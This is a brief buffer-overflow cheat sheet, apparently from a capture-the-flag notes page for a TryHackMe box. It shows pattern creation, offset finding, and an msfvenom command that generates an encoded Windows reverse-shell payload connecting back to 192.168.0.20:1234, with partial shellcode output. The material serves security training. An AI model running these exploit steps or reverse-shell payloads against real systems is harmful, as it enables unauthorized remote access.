# Reversing

Create a string of characters for use in buffer overflows:

```bash
root@kali:/home/kali/thm/brainstorm# python -c 'print "A" * 1000'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Use msf-pattern to create unique patterns for use in buffer overflows:

```bash
root@kali:/home/kali/thm/brainstorm# msf-pattern_create -l 2500
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7A
```

Use msf-pattern to find offset when buffer overflow has been achieved:

```bash
root@kali:/home/kali/thm/brainstorm# msf-pattern_offset -l 2500 -q 31704330
[*] Exact match at offset 2012
```

Create shellcode using MSFVenom:

```bash
root@kali:/home/kali/thm/brainstorm# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1712 bytes
buf =  b""
buf += b"\xba\x40\xfd\xb6\x4c\xd9\xe9\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x10\xf3\x54"
buf += b"\xb9\x6c\xe3\x1b\x42\x8c\xf4\x7b\xca\x69\xc5\xbb\xa8"
```

Those parameters explained:

```
-p windows/shell_reverse_tcp = Payload is a Windows reverse shell
LHOST=192.168.0.20           = IP to connect back to is my Kali machine
LPORT=1234                   = Port to connect to on Kali
-f py                        = Output payload in python for our script
-e x86/shikata_ga_nai        = Which encoder to use
-b "\x00"                    = Bad characters to avoid
```

Walkthroughs here for reversing/binary exploitation:

{% embed url="https://pencer.io/ctf/ctf-thm-brainstorm" %}
